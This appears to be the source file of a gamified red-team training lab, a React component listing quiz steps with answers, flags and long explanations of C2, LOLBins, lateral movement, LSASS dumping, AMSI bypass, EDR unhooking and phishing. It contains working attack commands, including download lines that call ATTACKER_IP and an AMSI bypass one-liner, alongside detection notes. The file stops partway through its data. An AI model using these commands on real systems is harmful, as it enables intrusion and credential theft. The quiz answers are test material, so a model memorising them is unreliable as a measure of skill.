'use client'
import React, { useState, useEffect } from 'react'
import Link from 'next/link'
import LabTerminal, { LabStep } from '../../../components/LabTerminal'
import FreeLabTerminal from '../../../components/FreeLabTerminal'

const accent = '#ff3333'
const moduleId = 'red-team'
const moduleName = 'Red Team Operations'
const moduleNum = '11'
const steps: LabStep[] = [

  // ── PHASE 1: C2 INFRASTRUCTURE ────────────────────────────────────────────

  {
    id: 'redteam-01',
    title: 'Phase 1 — C2 Framework Architecture',
    objective: `A red team engagement requires a Command & Control (C2) framework for managing implants, running post-exploitation modules, and coordinating team activity. C2 frameworks provide the persistent communication channel between the red team operator and compromised hosts. Modern frameworks must evade EDR behavioural detection, blend into legitimate network traffic, and support multiple operators simultaneously. Name one open-source C2 framework that uses mutual TLS for implant communication and supports multiple protocols including DNS, HTTP, and WireGuard.`,
    hint: 'Sliver is a modern open-source C2 by BishopFox with mTLS, DNS, HTTP/S and WireGuard listeners.',
    answers: ['sliver', 'havoc', 'cobalt strike', 'brute ratel', 'metasploit', 'empire', 'covenant'],
    xp: 20,
    explanation: `C2 frameworks are the central nervous system of a red team operation. Understanding their architecture is essential for both operators and defenders.

C2 framework comparison:
  Cobalt Strike    Commercial ($3500/yr), industry standard, huge community, Malleable C2 profiles
                   Heavily signatured by EDRs — requires significant customisation
  Sliver           Open-source (BishopFox), mTLS/WireGuard/DNS/HTTP, Go-based implants
                   Less EDR coverage, actively developed, good for learning
  Havoc            Open-source, HTTP/S, SMB, custom profiles, C-based implants
                   Modern evasion features, growing community
  Brute Ratel C4   Commercial, designed around EDR evasion, used by APT groups
  Metasploit       Open-source, Meterpreter payload, widely known = heavily detected

C2 architecture components:
  Team Server:    Backend process that manages all active sessions and operator connections
  Listener:       Network service accepting implant callbacks (HTTPS on 443, DNS on 53, etc.)
  Implant/Beacon: Malicious code running on the victim host that calls home to the listener
  Operator:       Red team member connected to team server via C2 client

Communication models:
  Interactive:   Implant connects frequently (every few seconds) — fast but detectable
  Beacon/Sleep:  Implant checks in every N seconds with jitter — stealthy but slower
  Async:         Implant polls periodically, operator queues tasks for next check-in

Sliver quick start:
  sliver-server                              Start team server
  sliver                                     Connect operator client
  > https --lhost 0.0.0.0 --lport 443        Create HTTPS listener
  > generate --http C2_IP --os windows       Generate Windows implant
  > sessions                                 List active sessions
  > use SESSION_ID                           Interact with session`
  },
  {
    id: 'redteam-02',
    title: 'Phase 1 — Living Off the Land: LOLBins',
    objective: `Living-off-the-Land (LotL) attacks use legitimate OS binaries to execute malicious actions — bypassing application whitelisting since these binaries are signed and trusted by the OS. The LOLBAS project (Living Off the Land Binaries and Scripts) catalogs hundreds of Windows binaries that can be abused. certutil.exe is a Windows certificate management tool that can also download files and decode Base64 — making it a classic LOLBin for payload delivery. What certutil command downloads a file from a URL and saves it locally?`,
    hint: 'certutil uses -urlcache -split -f flags to download from a URL.',
    answers: ['certutil -urlcache -split -f', 'certutil -urlcache', 'certutil -f', 'bitsadmin', 'certutil'],
    xp: 25,
    explanation: `LOLBins are the preferred delivery mechanism for APT groups and sophisticated red teams — they leave no dropped malware files from unknown sources.

certutil file download (classic LOLBin):
  certutil -urlcache -split -f http://ATTACKER_IP/payload.exe C:/Windows/Temp/update.exe
  certutil -decode encoded.b64 payload.exe    Decode Base64 file to binary

Other high-value LOLBins:
  mshta.exe        Execute HTA (HTML Application) files from URL — VBScript/JScript execution
    mshta.exe http://ATTACKER_IP/payload.hta

  regsvr32.exe     Register COM server DLL — can execute remote scriptlets (Squiblydoo)
    regsvr32.exe /s /n /u /i:http://ATTACKER_IP/payload.sct scrobj.dll

  rundll32.exe     Execute DLL exports and JavaScript
    rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";...

  wscript.exe      Execute VBScript/JScript files
    wscript.exe //e:jscript payload.js

  msiexec.exe      Install MSI packages from URL
    msiexec.exe /q /i http://ATTACKER_IP/payload.msi

  bitsadmin.exe    Background Intelligent Transfer Service — downloads files
    bitsadmin /transfer job /download http://ATTACKER_IP/nc.exe C:/Temp/nc.exe

  powershell.exe   Download and execute in memory (most common)
    powershell -nop -w hidden -enc BASE64_ENCODED_COMMAND
    powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/script.ps1')"

Detection: Defenders use process parent-child relationship monitoring (why is Word spawning certutil?),
command-line argument analysis, and network connection monitoring for unexpected system binary network calls.
The LOLBAS project at lolbas-project.github.io catalogs all known LOLBins with examples.`
  },
  {
    id: 'redteam-03',
    title: 'Phase 1 — C2 OPSEC: Traffic Blending and Redirectors',
    objective: `Red team OPSEC requires C2 traffic to be indistinguishable from legitimate network traffic. Blue teams monitor for unusual outbound connections, high-frequency beaconing, and traffic to uncategorised domains. Cobalt Strike's Malleable C2 profiles define exactly how beacon HTTP traffic looks — headers, URIs, user-agent, sleep intervals, jitter. A well-crafted profile makes beacon traffic look identical to Microsoft Teams or Amazon S3 API calls. What is the C2 infrastructure component that sits between the implant and the team server, hiding the real C2 IP from blue team network analysis?`,
    hint: 'This intermediate server proxies traffic to the real C2 backend, keeping the team server IP hidden.',
    answers: ['redirector', 'c2 redirector', 'proxy', 'nginx redirector', 'socat redirector', 'apache mod_rewrite'],
    xp: 30,
    flag: 'FLAG{c2_opsec_mastered}',
    explanation: `C2 OPSEC is what separates detectable red teams from professional ones. Every layer of infrastructure must be designed for resilience and deception.

C2 redirector architecture:
  Implant -> VPS Redirector -> Team Server (hidden IP)

  If blue team burns the redirector IP, the team server is never exposed.
  Swap redirectors without changing the implant or team server.

nginx redirector config (passes C2 traffic, blocks everything else):
  if the URI matches your C2 path -> proxy_pass to team server
  everything else -> proxy_pass to a legitimate site (cdn.microsoft.com)
  Blue team scanning the redirector sees only legitimate responses.

Apache mod_rewrite redirector:
  RewriteEngine On
  RewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0 compatible agent"
  RewriteRule ^/updates/(.*)$ https://TEAM_SERVER_IP/updates/$1 [P,L]
  RewriteRule .* https://www.microsoft.com/ [R=302,L]

Domain OPSEC:
  Register domain 60+ days before engagement (aged domain = more trusted)
  Use domain with existing Alexa/Umbrella reputation if possible
  Categorise domain (submit to Bluecoat/Cisco Umbrella as business/technology)
  Match domain to your C2 profile theme (cdn-updates.net for CDN-mimicking profile)
  Use different domains per implant type (initial access vs long-haul persistence)

Sleep, jitter, and callback intervals:
  Sleep: 60 seconds between check-ins (vs 5s default = obvious beaconing pattern)
  Jitter: 25% randomisation — 45-75 second intervals (avoids periodic detection)
  Business hours only: only beacon 08:00-18:00 on weekdays — looks like business traffic

Malleable C2 profile features:
  http-get / http-post blocks define URI, headers, user-agent for each direction
  transform blocks encode payload: base64, mask, prepend/append legitimate-looking data
  stage block defines how the beacon payload is loaded into memory
  Process injection settings: which APIs to use for shellcode execution`
  },
  {
    id: 'redteam-04',
    title: 'Phase 2 — Lateral Movement: WMI, SMB, and WinRM',
    objective: `After gaining initial access and establishing a C2 beacon, lateral movement spreads access to other systems using harvested credentials. WMI (Windows Management Instrumentation) is one of the stealthiest lateral movement techniques — it uses legitimate Windows management functionality, requires no service installation, and generates less noise than PsExec. From Linux using Impacket, what tool executes commands on a remote Windows host via WMI using domain credentials?`,
    hint: 'Impacket includes wmiexec.py for WMI-based remote execution. The command prefix is impacket-wmiexec.',
    answers: ['wmiexec', 'impacket-wmiexec', 'wmiexec.py', 'wmic'],
    xp: 25,
    explanation: `Lateral movement is the most detection-prone phase — choose techniques based on the target environment's logging and EDR coverage.

WMI execution (stealthiest — no service creation, no SMB writes):
  From Linux: impacket-wmiexec DOMAIN/user:password@TARGET_IP
  From Windows: wmic /node:TARGET_IP /user:DOMAIN/user /password:pass process call create "cmd.exe /c whoami > C:/output.txt"
  WMI logs: Microsoft-Windows-WMI-Activity/Operational event log

SMB + PsExec (noisiest — creates a service, SMB write):
  impacket-psexec DOMAIN/user:password@TARGET_IP
  Creates PSEXESVC service in ADMIN$ share — highly detectable
  Use only when stealth is not required

SMBExec (stealthier than PsExec — no binary upload):
  impacket-smbexec DOMAIN/user:password@TARGET_IP
  Uses Windows Service Control Manager via SMB — still creates a service but no file drop

WinRM (PowerShell remoting — noisy but logged differently):
  evil-winrm -i TARGET_IP -u user -p password
  Requires WinRM enabled (port 5985/5986) — common in modern Windows environments
  Logs in Microsoft-Windows-WinRM/Operational and PowerShell Script Block logging

CrackMapExec for bulk lateral movement:
  cme smb 192.168.1.0/24 -u admin -p Password123 --shares    Check access everywhere
  cme smb 192.168.1.0/24 -u admin -H NTLM_HASH -x "whoami"   Execute on all reachable hosts
  cme winrm 192.168.1.0/24 -u admin -p pass -x "whoami"       WinRM execution

Choosing your technique:
  Low detection tolerance: WMI (no service) or DCOM (no file drop)
  Speed needed: PsExec (fast but noisy)
  Interactive shell: evil-winrm or impacket-psexec
  Kerberos-only environment: use Pass-the-Ticket via Rubeus before lateral movement`,
    flag: 'FLAG{lateral_movement_complete}'
  },
  {
    id: 'redteam-05',
    title: 'Phase 2 — Persistence: Multiple Mechanisms',
    objective: `Persistence ensures continued access if the initial implant is killed, the system reboots, or credentials change. There are dozens of persistence mechanisms in Windows — from simple registry run keys to scheduled tasks, WMI event subscriptions, and COM object hijacking. The key is choosing mechanisms appropriate to the privilege level and OPSEC requirements. A scheduled task running as SYSTEM that calls back to C2 hourly is more resilient than a registry run key. What Windows command-line tool creates scheduled tasks?`,
    hint: 'The built-in Windows task scheduler command-line interface is schtasks.exe.',
    answers: ['schtasks', 'schtasks.exe', 'at', 'task scheduler'],
    xp: 25,
    flag: 'FLAG{persistence_established}',
    explanation: `Persistence mechanisms vary by privilege level, stealth requirement, and detection likelihood.

Scheduled tasks (SYSTEM level, survives reboots):
  schtasks /create /tn "Windows Update Helper" /tr "C:/Windows/Temp/update.exe" /sc hourly /ru SYSTEM
  schtasks /query /tn "Windows Update Helper"    Verify creation
  Detection: Event ID 4698 (task created), Autoruns shows all scheduled tasks

Registry run keys (user-level, runs at logon):
  HKCU/Software/Microsoft/Windows/CurrentVersion/Run   Current user logon
  HKLM/Software/Microsoft/Windows/CurrentVersion/Run   All users logon (requires admin)
  HKLM/Software/Microsoft/Windows/CurrentVersion/RunOnce  Runs once then deletes

WMI Event Subscription (stealthy, survives reboots, no file on disk needed):
  Three parts: EventFilter (what event triggers) + EventConsumer (what action) + FilterToConsumerBinding
  Can trigger on: system events, time intervals, user logon, process creation
  Fileless option: CommandLineEventConsumer executes commands directly
  Detection: Get-WMIObject -Namespace root/subscription -Class __EventFilter

COM Hijacking (low privilege, stealthy):
  User-writable HKCU/Software/Classes overrides HKLM COM registrations
  When a legitimate application loads a hijacked COM object, your DLL loads instead
  Detection: Procmon filtering for "NAME NOT FOUND" in HKCU then "SUCCESS" in HKLM

DLL Search Order Hijacking:
  Windows searches directories in order: application dir, system32, path
  Place malicious DLL with same name as legitimate DLL in a writable directory earlier in the path
  Application loads your DLL thinking it is the real one

Boot/Pre-OS persistence (highest privilege):
  Bootkit: infects MBR/VBR to load before Windows (requires physical access or kernel exploit)
  UEFI implant: survives OS reinstall (used by Fancy Bear/Turla)`,
  },
  {
    id: 'redteam-06',
    title: 'Phase 2 — Process Injection: Hiding in Legitimate Processes',
    objective: `Process injection executes malicious code inside a legitimate process — svchost.exe, explorer.exe, or a browser. The injected code inherits the host process's security context, network identity, and trusted status. Classic injection uses three Win32 API calls in sequence. EDRs monitor these API calls with userland hooks, but the calls must happen in sequence — each one is necessary. What Win32 API writes shellcode bytes into the virtual address space of a remote target process?`,
    hint: 'The sequence is: allocate, WRITE, execute. The write call is WriteProcessMemory.',
    answers: ['WriteProcessMemory', 'NtWriteVirtualMemory', 'VirtualAllocEx', 'CreateRemoteThread'],
    xp: 25,
    explanation: `Process injection is fundamental to red team tradecraft — understanding the API chain helps you choose the right technique and understand EDR detections.

Classic injection (VirtualAllocEx + WriteProcessMemory + CreateRemoteThread):
  1. OpenProcess(PROCESS_ALL_ACCESS, target_pid)         Get handle to target
  2. VirtualAllocEx(handle, NULL, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
  3. WriteProcessMemory(handle, alloc_addr, shellcode, size, NULL)
  4. CreateRemoteThread(handle, NULL, 0, alloc_addr, NULL, 0, NULL)

EDR detection: Cross-process memory writes + remote thread creation = immediate alert in most EDRs.

Stealthier alternatives:

Process Hollowing:
  CreateProcess(target, SUSPENDED)               Start process in suspended state
  NtUnmapViewOfSection(proc, base_addr)          Unmap original PE from memory
  VirtualAllocEx + WriteProcessMemory            Write malicious PE to now-empty memory
  SetThreadContext(thread, new_entry_point)       Point execution to malicious code
  ResumeThread(thread)                           Resume execution

Reflective DLL Injection:
  DLL loads itself into memory without using LoadLibrary — no disk artifact
  Used by Metasploit, Cobalt Strike Beacon, many other frameworks

Early Bird APC Injection:
  Create suspended process -> queue APC (Asynchronous Procedure Call) -> resume
  APC executes before the main thread — avoids some hook-based detections

Module Stomping / DLL Hollowing:
  Load a legitimate DLL into memory -> overwrite its .text section with shellcode
  Process's module list shows a legitimate DLL name — defeats module inspection

Threadless Injection (modern, no CreateRemoteThread):
  Use hardware breakpoints or exception handlers to redirect execution
  No new threads created — avoids thread-creation-based detection`,
  },
  {
    id: 'redteam-07',
    title: 'Phase 2 — Token Impersonation and Privilege Escalation',
    objective: `Windows uses access tokens to represent the security context of processes and threads. When a privileged user (Domain Admin, SYSTEM) is logged in, their token is available for impersonation by processes with the SeImpersonatePrivilege. This privilege is held by IIS, SQL Server, and many service accounts — making it a common post-exploitation path from web shell or service account compromise to SYSTEM. What privilege allows a process to impersonate another user's security token?`,
    hint: 'The privilege is called SeImpersonatePrivilege — held by service accounts and IIS worker processes.',
    answers: ['SeImpersonatePrivilege', 'impersonate privilege', 'token impersonation', 'incognito'],
    xp: 20,
    flag: 'FLAG{token_impersonated}',
    explanation: `Token impersonation is often the bridge between low-privilege service account access and SYSTEM or Domain Admin.

SeImpersonatePrivilege — who has it by default:
  IIS worker processes (w3wp.exe) — web shells get this privilege
  SQL Server service account — SQLi to xp_cmdshell gets this
  Print Spooler — PrintNightmare exploits leverage this
  Network services — WCF services, COM+ applications

Potato attacks — escalate from SeImpersonatePrivilege to SYSTEM:
  PrintSpoofer:    Forces SYSTEM authentication → captures token → SYSTEM shell
    PrintSpoofer64.exe -i -c cmd
  GodPotato:       Works on Windows Server 2012-2022, CLSID-based NTLM reflection
    GodPotato.exe -cmd "cmd /c whoami"
  SweetPotato:     Combines multiple potato techniques with shellcode execution
  RoguePotato:     Requires controlled endpoint but most reliable

Incognito (Meterpreter module for token theft):
  use incognito
  list_tokens -u                  List all available impersonation tokens
  impersonate_token "CORP/Administrator"   Steal admin token if logged in

Access token manipulation via Win32 API:
  OpenProcessToken(target_process, TOKEN_DUPLICATE)
  DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary)
  CreateProcessWithTokenW(dup_token, 0, "cmd.exe", ...)   Spawn process as that user

Detection: Event ID 4624 with logon type 3 + unusual process impersonating another user,
unusual process parent-child relationships, Potato tool signatures (PrintSpoofer name in command).`,
  },
  {
    id: 'redteam-08',
    title: 'Phase 3 — Kerberoasting: Service Ticket Offline Cracking',
    objective: `Kerberoasting exploits the Kerberos protocol's service ticket mechanism. Any authenticated domain user can request a service ticket (TGS) for any account with a Service Principal Name (SPN). The TGS is encrypted with the service account's NT hash. You can request thousands of these tickets and crack them offline — no interaction with the target service required, no alerts, no lockouts. What Impacket tool requests service tickets for all SPN accounts and outputs crackable hashes from Linux?`,
    hint: 'The Impacket tool is GetUserSPNs.py — its impacket- prefixed name is impacket-GetUserSPNs.',
    answers: ['impacket-GetUserSPNs', 'GetUserSPNs.py', 'rubeus', 'rubeus.exe kerberoast', 'invoke-kerberoast'],
    xp: 25,
    explanation: `Kerberoasting is reliable, low-risk, and effective — it requires only a valid domain user account and generates no alerts in most environments.

From Linux (no domain-joined machine needed):
  impacket-GetUserSPNs CORP/user:password -dc-ip DC_IP -outputfile hashes.txt
  impacket-GetUserSPNs CORP/user -hashes :NTLM_HASH -dc-ip DC_IP -request   (PtH-based)

From Windows (on a domain-joined host):
  Rubeus.exe kerberoast /outfile:hashes.txt /nowrap
  Rubeus.exe kerberoast /user:svc_backup /outfile:target_hash.txt   (single account)
  Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File hashes.txt

Hash format: $krb5tgs$23$*...  (etype 23 = RC4-HMAC, most crackable)
             $krb5tgs$18$*...  (etype 18 = AES-256, much harder to crack)

Cracking with hashcat:
  hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
  hashcat -m 13100 hashes.txt rockyou.txt -r rules/best64.rule

Targeting strategy — prioritise by:
  1. Accounts in privileged groups (Domain Admins, Server Operators)
  2. Service accounts used by specific high-value services (backup, SQL, Exchange)
  3. Accounts with weak password policies (service accounts often exempt from complexity)
  4. Etype 23 (RC4) preferred over etype 18 (AES) — RC4 cracks 10x faster

OPSEC considerations:
  Request tickets one at a time for targeted accounts (vs requesting all = noisier)
  RC4 downgrade can be detected: requesting RC4 ticket for AES-configured account triggers alert
  Rubeus /rc4opsec flag only requests RC4 for accounts that haven't set AES keys

Prevention: gMSA (Group Managed Service Accounts) with 240-char auto-rotating passwords, audit SPNs.`
  },
  {
    id: 'redteam-09',
    title: 'Phase 3 — Credential Dumping: LSASS and Beyond',
    objective: `LSASS (Local Security Authority Subsystem Service) caches credentials of logged-in users — NT hashes, Kerberos tickets, and sometimes plaintext passwords. Dumping LSASS is the highest-value credential harvesting action on a Windows host. Modern EDRs aggressively protect LSASS — direct API-based dumping is caught instantly. The comsvcs.dll MiniDump technique uses a legitimate Windows DLL to create the dump, making it harder to block. What Windows built-in command uses comsvcs.dll to dump LSASS without dropping external tools?`,
    hint: 'The command uses rundll32.exe with comsvcs.dll and the MiniDump export, passing the LSASS PID.',
    answers: ['rundll32 comsvcs.dll MiniDump', 'rundll32 comsvcs.dll', 'comsvcs.dll minidump', 'rundll32'],
    xp: 25,
    explanation: `LSASS credential dumping is the single most impactful action in Windows post-exploitation — it provides hashes for Pass-the-Hash, tickets for Pass-the-Ticket, and sometimes plaintext passwords.

comsvcs.dll MiniDump (LOLBin approach):
  Get LSASS PID: Get-Process lsass | Select Id   (or: tasklist | findstr lsass)
  rundll32 C:/Windows/System32/comsvcs.dll MiniDump LSASS_PID C:/Windows/Temp/lsass.dmp full
  Transfer dump to attacker machine: impacket-smbserver share ./
  Parse offline: pypykatz lsa minidump lsass.dmp   (outputs hashes, Kerberos tickets, plaintext)

mimikatz (direct — caught by most EDRs):
  privilege::debug                     Request SeDebugPrivilege
  sekurlsa::logonpasswords             Dump credentials from LSASS memory
  sekurlsa::tickets /export            Export Kerberos tickets to .kirbi files
  lsadump::sam                         Dump SAM database (local accounts)
  lsadump::dcsync /user:krbtgt         DCSync the krbtgt hash (no local dump needed)

LSASS protection bypass techniques:
  ProcDump (Sysinternals — often allowed by AV):
    procdump.exe -ma lsass.exe lsass.dmp

  Nanodump (kernel driver — bypasses userland hooks):
    nanodump --write C:/Windows/Temp/lsass.dmp

  SilentProcessExit (abuses Windows Error Reporting):
    Registers LSASS for silent process exit → WER creates dump automatically

Credential Guard (blocks most LSASS dumping):
  Runs LSASS in isolated virtualization-based security container
  NT hashes not stored in LSASS memory → cannot dump them
  Kerberos keys still accessible via DCSync if you have DA

SAM and LSA Secrets (local credentials, no LSASS needed):
  impacket-secretsdump -sam SAM -system SYSTEM LOCAL   (offline registry files)
  impacket-secretsdump CORP/admin:pass@TARGET_IP       (remote, requires DA or local admin)`,
  },
  {
    id: 'redteam-10',
    title: 'Phase 3 — AMSI Bypass and ETW Patching',
    objective: `AMSI (Antimalware Scan Interface) intercepts all PowerShell script content before execution and passes it to registered AV/EDR products. Any known malicious script (mimikatz, Invoke-Mimikatz, SharpHound) is caught before a single line runs. The most common bypass patches the AmsiScanBuffer function in amsi.dll in memory to always return AMSI_RESULT_CLEAN. This requires no elevated privileges — any user can patch AMSI in their own process. What .NET reflection technique sets the amsiInitFailed field to true, causing AMSI to skip initialisation?`,
    hint: 'The technique accesses the AmsiUtils class internals via .NET reflection and sets amsiInitFailed to $true.',
    answers: ['amsi bypass', 'amsiInitFailed', 'reflection amsi', 'patch amsi', 'amsi.dll patch'],
    flag: 'FLAG{opsec_advanced}',
    xp: 30,
    explanation: `AMSI bypass is required before loading any known offensive PowerShell tool. Modern EDRs also monitor ETW (Event Tracing for Windows) for telemetry — patching both is necessary for full evasion.

Classic amsiInitFailed bypass (heavily signatured, but shows the concept):
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

  This must be obfuscated to avoid AMSI scanning the bypass itself:
  String concatenation: 'amsiIn' + 'itFailed'
  Character arrays: [char[]]@('a','m','s','i'...) -join ''
  Variable substitution: $x='amsi';$y='InitFailed'; use "$x$y"
  Base64 encoding: decode at runtime

Memory patch approach (patches AmsiScanBuffer return value):
  Uses P/Invoke to find AmsiScanBuffer address in amsi.dll
  Overwrites first bytes with: 0xB8,0x57,0x00,0x07,0x80,0xC3
  This is: mov eax, 0x80070057 (E_INVALIDARG); ret
  AMSI scan returns error → AV product ignores the result

PowerShell version downgrade (no AMSI in PS v2):
  powershell.exe -version 2   Requires .NET 2.0 still installed
  PowerShell 2.0 has no AMSI, no Script Block Logging, no Constrained Language Mode
  Detection: Process creation with -version 2 flag

ETW patching (disables PowerShell telemetry):
  ETW is how EDRs get PowerShell command transcripts and script block logs
  Patch EtwEventWrite in ntdll.dll to return immediately without writing
  Combined with AMSI bypass: completely blind PowerShell execution

Constrained Language Mode (CLM) bypass:
  CLM restricts .NET type access in PowerShell — blocks most tooling
  Bypass via: runspaces, COM objects, downgrade to PS v2, Bypass-CLM tool

Detection:
  Script Block Logging (Event ID 4104) logs PowerShell even in AMSI bypass scenarios
  Modern EDRs use kernel-level telemetry (ETW consumers in kernel space) not patchable from userland
  Behavioural detection: encoded commands, reflection, memory-only execution patterns`,
  },
  {
    id: 'redteam-11',
    title: 'Phase 3 — EDR Evasion: Unhooking and Direct Syscalls',
    objective: `Modern EDRs inject a DLL into every process and patch the first bytes of sensitive NT API functions (NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx) with a JMP instruction to the EDR's analysis code. Every suspicious API call goes through the EDR before reaching the kernel. The bypass: load a fresh, unhooked copy of ntdll.dll directly from disk and copy its .text section over the hooked in-memory version — restoring clean API stubs. What is this technique called?`,
    hint: 'Restoring the original un-hooked state of ntdll.dll is called ntdll unhooking.',
    answers: ['unhooking', 'ntdll unhooking', 'direct syscalls', 'syscall', 'SysWhispers'],
    xp: 30,
    explanation: `EDR evasion is an arms race. Understanding both sides — what EDRs detect and how bypasses work — is essential for red teamers and defenders.

How EDR userland hooking works:
  EDR injects its DLL (e.g., CrowdStrikeFalcon.dll) into every process at startup
  It patches the first 5 bytes of sensitive NT functions in ntdll.dll with:
    E9 XX XX XX XX   (JMP XXXXXXXX — jump to EDR analysis code)
  Every call to NtAllocateVirtualMemory goes to EDR first, then kernel

ntdll Unhooking:
  1. Open a fresh handle to ntdll.dll on disk (not the in-memory hooked copy)
  2. Map it into memory: CreateFileMapping + MapViewOfFile
  3. Find .text section (where the hooked stubs are)
  4. Copy the clean .text section over the hooked in-memory ntdll .text section
  5. All NT stubs now restored — EDR hooks gone

Direct Syscalls (SysWhispers2/SysWhispers3):
  Rather than calling NT functions through ntdll, call the kernel directly
  Each NT function is just a thin wrapper: mov eax, SSN (System Service Number); syscall
  SysWhispers generates assembly stubs with hardcoded or dynamically resolved SSNs
  Stubs go directly to kernel — never touch the hooked ntdll

Hell's Gate / Halo's Gate:
  Dynamically resolve SSNs at runtime (handles different Windows versions)
  Halo's Gate: if a function is hooked, find SSN from a neighbouring unhooked function

Sleep obfuscation (evading memory scanners):
  EDRs scan process memory for beacon signatures during sleep
  Encrypt the beacon in memory while sleeping, decrypt just before next operation
  Foliage, Ekko, Zilean: sleep obfuscation implementations

PPID spoofing (break parent-child process detection):
  CreateProcess normally gives you as parent — suspicious if Word spawns cmd
  Spoof parent PID to be explorer.exe using STARTUPINFOEX + UpdateProcThreadAttribute
  Process tree looks normal: explorer.exe -> cmd.exe (not Word.exe -> cmd.exe)

Detect EDR hooks yourself:
  Check if first bytes of NtAllocateVirtualMemory are E9 (JMP) — hooked
  Check if first bytes are 4C 8B D1 (mov r10, rcx) — clean syscall stub`,
    flag: 'FLAG{edr_evasion_complete}'
  },
  {
    id: 'redteam-12',
    title: 'Phase 4 — Initial Access: Phishing Infrastructure',
    objective: `Professional red team phishing infrastructure is purpose-built for a single engagement — dedicated domains, SMTP relays with valid SPF/DKIM/DMARC, and landing pages served over TLS. GoPhish manages the entire campaign — sending emails, tracking opens via tracking pixel, tracking clicks, and capturing credentials from landing pages. Evilginx2 goes further: it acts as a transparent reverse proxy between the victim and the real site, capturing session cookies even when MFA is used. What GoPhish component defines the appearance of the fake login page shown to victims?`,
    hint: 'In GoPhish, the fake web page victims land on is called a Landing Page.',
    answers: ['landing page', 'landing pages', 'gophish landing page', 'credential capture page'],
    xp: 25,
    explanation: `Phishing infrastructure must survive spam filters, URL scanners, and blue team investigation while appearing completely legitimate.

GoPhish campaign components:
  Sending Profile:  SMTP credentials, from address, envelope sender
  Email Template:   Subject, body (HTML), tracking pixel, phishing link
  Landing Page:     Fake login page with credential capture form
  Campaign:         Ties all components together, sets target list and schedule

Tracking pixel mechanics:
  1x1 transparent GIF image hosted on GoPhish server
  When email is opened, browser loads the image — GoPhish records: IP, user-agent, timestamp
  Open rate shows how many targets received and opened the email

Domain infrastructure requirements:
  Aged domain: registered 30+ days before campaign (new domains = higher spam score)
  Valid MX records pointing to your SMTP relay
  SPF: v=spf1 include:your-smtp.com -all
  DKIM: mail signed with private key — public key in DNS
  DMARC: p=none initially to avoid rejection
  TLS certificate: Let's Encrypt for the landing page domain

Evilginx2 — MFA bypass via session cookie theft:
  Sits transparently between victim and real login page
  Victim logs in normally (real credentials, real MFA) — on the REAL site
  Evilginx intercepts the authenticated session cookie AFTER MFA approval
  Attacker imports that cookie — logged in as victim WITHOUT knowing password or MFA code

Payload delivery alternatives to credential phishing:
  HTML Smuggling: JS in HTML assembles payload bytes and triggers download — bypasses email attachment scanning
  ISO/IMG containers: bypass Mark of the Web (MOTW) so macros run without warning
  OneNote attachments: .one files with embedded LNK files (used heavily by APTs in 2023)
  QR codes: link in email uses QR code → victim scans with phone → bypasses corporate URL filter`,
    flag: 'FLAG{initial_access}'
  },
  {
    id: 'redteam-13',
    title: 'Phase 4 — Supply Chain Attacks',
    objective: `Supply chain attacks compromise a target by attacking a trusted third party — a software vendor, open-source package, or IT service provider — rather than attacking the target directly. SolarWinds (2020) and the XZ Utils backdoor (2024) demonstrated that supply chain attacks can simultaneously compromise thousands of organisations. Dependency confusion attacks exploit how package managers (npm, pip, PyPI) resolve package names — a public package with the same name as a private internal package gets installed instead. What type of supply chain attack registers a public package with the same name as a target's internal package?`,
    hint: 'This attack exploits package manager resolution priority between public and private registries.',
    answers: ['dependency confusion', 'namespace confusion', 'dependency hijacking', 'package confusion'],
    xp: 30,
    explanation: `Supply chain attacks are the most scalable attack vector — compromise one supplier, reach thousands of targets.

Dependency Confusion (Alex Birsan, 2021):
  Target company uses internal npm package: @company/internal-auth (hosted on private registry)
  Attacker publishes: internal-auth (no scope) on public npm registry with higher version number
  npm resolves public packages over private by default if version is higher
  Developer runs npm install → gets attacker's malicious package instead of internal one
  Birsan collected $130,000+ in bug bounties from Apple, Microsoft, PayPal, Tesla, Uber

Typosquatting (similar, simpler):
  Register: reqeusts (vs requests), colourama (vs colorama), djagngo (vs django)
  Developers mistype package name → install malicious version
  Historical examples: event-stream (2018, compromised to steal Bitcoin)

SolarWinds attack (Nobelium/APT29, 2020):
  Attackers compromised SolarWinds build pipeline
  Inserted SUNBURST backdoor into Orion software update package
  18,000 customers installed the update including US Treasury, State Dept, DoD
  Backdoor dormant for 2 weeks, then beaconed to C2 disguised as Orion API traffic

XZ Utils backdoor (2024):
  Attacker spent 2 years building trust in the XZ Utils open-source project
  Became a trusted maintainer, then inserted backdoor targeting sshd
  Backdoor would allow authentication bypass on systems with vulnerable liblzma
  Caught by a Microsoft engineer who noticed unexpected CPU usage in SSH

Red team supply chain simulation:
  Identify target's npm/pip/Maven dependencies in public GitHub repos
  Check if private package names are used without scoping
  Register same name on public registry with higher version
  This is authorised demonstration of the risk — not actual malicious payload

Defence: Private registries with explicit scoping (@company/ prefix), package signing (Sigstore),
lock files (package-lock.json, Pipfile.lock), dependency review in CI/CD, SBOM (Software Bill of Materials).`
  },
  {
    id: 'redteam-14',
    title: 'Phase 4 — Purple Team: Bridging Red and Blue',
    objective: `Purple teaming is a collaborative exercise where the red team and blue team work together in real-time — the red team executes techniques while the blue team attempts to detect them, and both share findings immediately. This accelerates security improvement far more than traditional adversarial red team engagements. MITRE ATT&CK provides the common language — techniques are identified by TTP IDs (e.g., T1055 for Process Injection). What MITRE ATT&CK tactic covers the techniques used to maintain access after initial compromise?`,
    hint: 'The tactic that covers registry run keys, scheduled tasks, and WMI subscriptions is Persistence.',
    answers: ['persistence', 'TA0003', 'MITRE persistence', 'tactic persistence'],
    xp: 20,
    explanation: `Purple teaming is the most efficient way to improve detection coverage — immediate feedback loops instead of months between red team report and blue team response.

MITRE ATT&CK tactic structure:
  TA0001  Initial Access          How attackers get in (phishing, exploit, supply chain)
  TA0002  Execution               Running malicious code (PowerShell, WMI, scheduled tasks)
  TA0003  Persistence             Maintaining access (registry, startup, services)
  TA0004  Privilege Escalation    Getting more permissions (token theft, UAC bypass, Kerberos)
  TA0005  Defense Evasion         Avoiding detection (obfuscation, unhooking, timestomping)
